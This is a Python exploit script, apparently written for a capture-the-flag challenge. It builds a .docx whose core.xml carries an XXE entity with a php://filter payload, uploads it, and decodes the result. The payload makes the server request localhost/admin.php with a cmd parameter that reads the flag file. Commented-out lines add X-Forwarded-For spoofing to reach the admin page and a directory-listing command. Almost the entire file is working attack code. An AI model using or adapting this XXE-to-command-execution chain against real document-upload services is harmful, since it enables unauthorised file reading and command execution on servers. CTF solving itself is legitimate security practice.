import shutil
import asyncio
import aiofiles
import aiohttp
import base64
import os

URL = "http://chal.firebird.sh:35046/"

CORE_XML = """
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE payload [
        <!ENTITY xxe SYSTEM "{payload}" >
        ]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
                   xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>&xxe;</dc:title>
    <dc:subject>Subject</dc:subject>
    <dc:creator>HeroGamers</dc:creator>
    <dc:description>Description</dc:description>
    <cp:lastModifiedBy>HeroGamers</cp:lastModifiedBy>
    <cp:revision>1</cp:revision>
</cp:coreProperties>
""".replace("\r", "").replace("\n", "").strip()


async def upload_payload(session, payload):
    # Make sure we have the dir for the payload
    os.makedirs("payload", exist_ok=True)
    os.makedirs("payload/docProps", exist_ok=True)

    # Copy the payload to the dir
    async with aiofiles.open("payload/docProps/core.xml", "w") as f:
        await f.write(CORE_XML.format(payload=payload))

    # Zip the dir to a docx file
    shutil.make_archive("payload", "zip", "payload")

    # If a file with the same name exists, delete it
    if os.path.exists("payload.docx"):
        os.remove("payload.docx")

    # Rename the zip file to docx
    os.rename("payload.zip", "payload.docx")

    # Ensure the file exists
    if not os.path.exists("payload.docx"):
        print("Failed to create payload")
        return

    # Upload the payload and get the response
    with aiohttp.MultipartWriter("form-data") as mp:
        # Attach the file
        part = mp.append(open("payload.docx", "rb"))
        part.set_content_disposition("form-data", name="file", filename="payload.docx")
        # Attach the submit button
        part = mp.append("Upload")
        part.set_content_disposition("form-data", name="submit")
        async with session.post(URL, data=mp) as resp:
            if resp.status != 200:
                print("Upload failed")
                return
            res_text = await resp.text()
            if "<pre>" not in res_text:
                print("Payload response not found")
                print(f"Upload response: {res_text}")
                return None
            payload_res_base64 = res_text.split("<pre>")[1].split("</pre>")[0].split("Title: ")[1].split("Subject:")[0].strip()
            payload_res = base64.b64decode(payload_res_base64).decode("utf-8")
            print(f"Payload response: {payload_res}")
            return payload_res


async def admin_request(session):
    async with session.get(URL + "admin.php",
                           headers={
                               "X-Forwarded-For": "127.0.0.1",
                               "X-Http-Forwarded-For": "127.0.0.1"
                           }) as resp:
        if resp.status != 200:
            print("Admin request failed")
            return
        res_text = await resp.text()
        return res_text


async def main():
    async with aiohttp.ClientSession() as session:
        # res = await admin_request(session)
        # print(res)
        # payload = "php://filter/convert.base64-encode/resource=http://localhost/admin.php?cmd=ls%20../../../"
        payload = "php://filter/convert.base64-encode/resource=http://localhost/admin.php?cmd=cat%20../../../flag_ab8393a93a942f257c4bf6ae1cc63cc0"
        # payload = "http://localhost/index.php"
        await upload_payload(session, payload)


if __name__ == "__main__":
    asyncio.run(main())
